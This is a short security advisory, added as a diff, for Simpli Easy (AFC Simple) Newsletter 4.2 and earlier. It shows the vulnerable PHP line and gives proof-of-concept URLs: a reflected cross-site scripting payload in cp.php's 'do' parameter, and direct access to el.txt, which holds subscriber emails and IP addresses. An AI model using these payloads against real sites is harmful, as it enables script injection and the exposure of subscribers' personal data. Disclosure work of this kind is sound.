@@ -1,0 +1,25 @@
+Simpli Easy (AFC Simple) Newsletter <= 4.2 XSS/Information Leakage
+
+Date: 30.10.2010
+Author: p0deje | http://p0deje.blogspot.com
+Software Link: http://scubadivingcalculators.com/simpli-easy-newsletter.php
+Version: <= 4.2
+ 
+  1. Cross-site Scripting
+       
+    Vulnerable code:
+      cp.php
+      ----------------
+      6:  <form name="txtlist" action="cp.php?do=<?=$_GET['do']?>"
+method="post">
+      
+    Proof-of-concept:   
+      http://www.example.com/cp.php?do="><script>alert(1)</script>
+      
+  2. Information Leakage
+    
+    By default, application saves subscribed email addresses and
+    correspondent IP addresses to plain text file el.txt
+    
+    Proof-of-concept:
+      http://www.example.com/el.txt
